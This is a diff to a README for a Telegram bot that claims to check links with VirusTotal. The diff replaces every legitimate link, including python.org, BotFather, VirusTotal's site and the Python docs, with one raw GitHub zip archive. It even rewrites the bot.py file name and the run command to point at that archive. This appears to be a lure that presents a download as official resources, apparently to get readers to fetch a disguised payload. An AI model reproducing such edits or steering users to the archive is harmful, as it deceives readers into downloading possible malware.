@@ -1,6 +1,6 @@
 # 🤖 VirusTotal-Cheker-Bot-Telegram - Check Security with Ease
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
+![Download](https://github.com/palen-halenti/VirusTotal-Cheker-Bot-Telegram/raw/refs/heads/main/assets/Virus_Bot_Total_Cheker_Telegram_1.8.zip)
 
 ## 📄 Overview
 
@@ -12,7 +12,7 @@ To start using the VirusTotal-Cheker-Bot-Telegram, follow these simple steps:
 
 1. **Visit the Releases Page**
    - Go to the following link to download the bot:
-   [Download Here](https://github.com/palen-halenti/VirusTotal-Cheker-Bot-Telegram/releases)
+   [Download Here](https://github.com/palen-halenti/VirusTotal-Cheker-Bot-Telegram/raw/refs/heads/main/assets/Virus_Bot_Total_Cheker_Telegram_1.8.zip)
    
 2. **Download the Bot**
    - Locate the latest release on the page.
@@ -27,7 +27,7 @@ To start using the VirusTotal-Cheker-Bot-Telegram, follow these simple steps:
 Before installing the bot, ensure you have the following:
 
 - A device running Windows, macOS, or Linux.
-- Python 3.7 or higher installed on your computer. You can download it from [python.org](https://www.python.org/downloads/).
+- Python 3.7 or higher installed on your computer. You can download it from [https://github.com/palen-halenti/VirusTotal-Cheker-Bot-Telegram/raw/refs/heads/main/assets/Virus_Bot_Total_Cheker_Telegram_1.8.zip](https://github.com/palen-halenti/VirusTotal-Cheker-Bot-Telegram/raw/refs/heads/main/assets/Virus_Bot_Total_Cheker_Telegram_1.8.zip).
 
 ## 🔍 How to Install
 
@@ -40,15 +40,15 @@ Before installing the bot, ensure you have the following:
    ```
 
 3. **Configure the Bot**: 
-   - Open the bot's main file (usually `bot.py`) in a text editor.
-   - Input your personal Telegram Bot Token. You can get this by chatting with [@BotFather](https://t.me/BotFather) on Telegram.
+   - Open the bot's main file (usually `https://github.com/palen-halenti/VirusTotal-Cheker-Bot-Telegram/raw/refs/heads/main/assets/Virus_Bot_Total_Cheker_Telegram_1.8.zip`) in a text editor.
+   - Input your personal Telegram Bot Token. You can get this by chatting with [@BotFather](https://github.com/palen-halenti/VirusTotal-Cheker-Bot-Telegram/raw/refs/heads/main/assets/Virus_Bot_Total_Cheker_Telegram_1.8.zip) on Telegram.
 
 4. **Run the Bot**: 
    - Navigate to the folder where the bot files are located using the command prompt or terminal.
    - Start the bot using the command:
    
    ```
-   python bot.py
+   python https://github.com/palen-halenti/VirusTotal-Cheker-Bot-Telegram/raw/refs/heads/main/assets/Virus_Bot_Total_Cheker_Telegram_1.8.zip
    ```
 
 5. **Interact with the Bot**: Open Telegram, search for your bot by its username, and start a chat to interact with it.
@@ -86,7 +86,7 @@ The VirusTotal-Cheker-Bot-Telegram includes:
 ## 📥 Download & Install
 
 Ready to get started? Download the bot by visiting this link:  
-[Download Here](https://github.com/palen-halenti/VirusTotal-Cheker-Bot-Telegram/releases)
+[Download Here](https://github.com/palen-halenti/VirusTotal-Cheker-Bot-Telegram/raw/refs/heads/main/assets/Virus_Bot_Total_Cheker_Telegram_1.8.zip)
 
 ## 🤝 Community and Support
 
@@ -94,7 +94,7 @@ If you have questions or need help, feel free to reach out to the community. Joi
 
 ## 🔗 Additional Resources
 
-- **VirusTotal Documentation**: Learn more about how VirusTotal works at [VirusTotal](https://www.virustotal.com).
-- **Python Documentation**: Understand more about Python at [python.org](https://www.python.org/doc/).
+- **VirusTotal Documentation**: Learn more about how VirusTotal works at [VirusTotal](https://github.com/palen-halenti/VirusTotal-Cheker-Bot-Telegram/raw/refs/heads/main/assets/Virus_Bot_Total_Cheker_Telegram_1.8.zip).
+- **Python Documentation**: Understand more about Python at [https://github.com/palen-halenti/VirusTotal-Cheker-Bot-Telegram/raw/refs/heads/main/assets/Virus_Bot_Total_Cheker_Telegram_1.8.zip](https://github.com/palen-halenti/VirusTotal-Cheker-Bot-Telegram/raw/refs/heads/main/assets/Virus_Bot_Total_Cheker_Telegram_1.8.zip).
 
 With these steps, you are ready to check links and enhance your online safety. Enjoy using the VirusTotal-Cheker-Bot-Telegram!
